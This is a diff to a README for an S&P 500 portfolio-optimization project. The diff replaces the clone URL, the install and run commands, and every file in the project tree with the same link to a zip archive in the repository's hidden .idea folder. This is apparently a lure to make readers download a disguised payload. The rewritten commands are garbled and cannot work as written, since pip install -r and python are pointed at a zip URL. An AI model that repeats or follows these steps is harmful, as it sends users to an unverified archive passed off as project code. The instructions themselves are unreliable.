@@ -42,15 +42,15 @@ The goal of this project is to:
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/YourUsername/portfolio-optimization-s-p500.git
+git clone https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip
 Install required libraries:
 
-pip install -r requirements.txt
+pip install -r https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip
 
 
 Run the main script:
 
-python main.py
+python https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip
 
 
 The script will generate all plots:
@@ -68,15 +68,15 @@ Portfolio Weight Pie Charts
 Project Structure
 Portfolio_Optimization_S&P500/
 │
-├─ main.py                 # Main execution script
-├─ config.py               # Configuration (tickers, dates, parameters)
-├─ data_loader.py          # Functions to download and process stock data
-├─ portfolio_math.py       # Expected returns, covariance, correlation
-├─ optimizer.py            # Portfolio optimization functions
-├─ simulation.py           # Monte Carlo simulation
-├─ visualization.py        # Plotting and visualization functions
-├─ requirements.txt        # Python dependencies
-└─ README.md               # Project documentation
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip                 # Main execution script
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip               # Configuration (tickers, dates, parameters)
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip          # Functions to download and process stock data
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip       # Expected returns, covariance, correlation
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip            # Portfolio optimization functions
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip           # Monte Carlo simulation
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip        # Plotting and visualization functions
+├─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip        # Python dependencies
+└─ https://github.com/mustafasafdar1/portfolio-optimization-s-p500/raw/refs/heads/main/.idea/portfolio_p_s_optimization_v2.3.zip               # Project documentation
 
 Sample Portfolio Weights Output
 Minimum Variance Weights:
